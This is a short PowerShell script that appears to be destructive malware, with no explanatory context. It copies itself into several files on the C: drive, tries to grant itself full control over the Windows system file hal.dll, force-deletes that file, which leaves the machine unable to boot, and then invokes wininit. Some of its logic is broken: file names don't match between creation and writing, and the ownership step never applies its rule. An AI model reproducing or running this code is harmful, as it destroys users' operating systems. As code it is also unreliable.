Add-Type -AssemblyName System.Windows.Forms
$scriptPath = $MyInvocation.MyCommand.Path
$scriptContent = Get-Content -Path $scriptPath
function Take-Ownership {
    param (
        [string]$path
    )
    $acl = Get-Acl $path
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($identity.Name, 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow')
    $acl.AddAccessRule($rule)
}
try {
for ($i = 1; $i -le 5; $i++) {
    New-Item -ItemType File -Path "C:\starlightCopy-$i.ps1"
    Set-Content -Path "C:\copy$i.ps1" -Value $scriptContent
}
New-Item -ItemType File -Path "C:\"
Take-Ownership -path "C:\Windows\System32\hal.dll"
Remove-Item -Path "C:\Windows\System32\hal.dll" -Force
} catch {
    [System.Windows.Forms.MessageBox]::Show($_, "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
}
wininit
